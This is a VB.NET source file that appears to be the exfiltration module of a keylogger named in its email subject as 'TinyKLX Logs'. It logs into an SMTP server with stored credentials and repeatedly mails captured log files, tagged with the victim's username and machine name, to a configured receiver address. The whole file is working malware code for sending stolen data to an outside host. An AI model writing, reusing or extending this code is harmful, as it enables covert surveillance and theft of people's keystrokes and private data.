Imports System.IO
Imports System.Net
Imports System.Threading
Imports MailKit.Net.Smtp
Imports MimeKit

Public Class Network

	Public Shared ReadOnly Property Mailer As New SmtpClient

	Public Shared Sub VerifyConnection()
		While True
			Try
				If Not Mailer.IsConnected Then
					Mailer.Connect(Config.SmtpServer, Config.SmtpPort)
				End If
				Utils.Log("Connected to Mail Server")
				If Not Mailer.IsAuthenticated Then
					Mailer.Authenticate(New NetworkCredential(Config.Sender, Config.Password))
				End If
				Utils.Log("Authenticated to Mail Server")
				Exit While
			Catch ex As Exception
				Utils.Log("Network verification failure: " + ex.Message)
			End Try
			Thread.Sleep(50)
		End While
	End Sub

	Public Shared Sub Send(name As String, data As Byte())
		Using ms As New MemoryStream(data)

			Dim msg As New MimeMessage

			Dim user = Environment.UserName + "@" + Environment.MachineName

			msg.From.Add(New MailboxAddress(user, Config.Sender))
			msg.To.Add(New MailboxAddress(user, Config.Receiver))

			msg.Subject = "TinyKLX Logs - " + Now.ToString("dd-MM-yyyy")

			Dim att As New MimePart("application/octet-stream")
			att.ContentObject = New ContentObject(ms)
			att.ContentTransferEncoding = ContentEncoding.Binary
			att.FileName = name
			att.ContentDisposition = New ContentDisposition(ContentDisposition.Attachment)

			msg.Body = att

			While True
				Try
					Mailer.Send(msg)
					Exit While
				Catch ex As Exception
					VerifyConnection()
				End Try
				Thread.Sleep(50)
			End While

		End Using
	End Sub

End Class
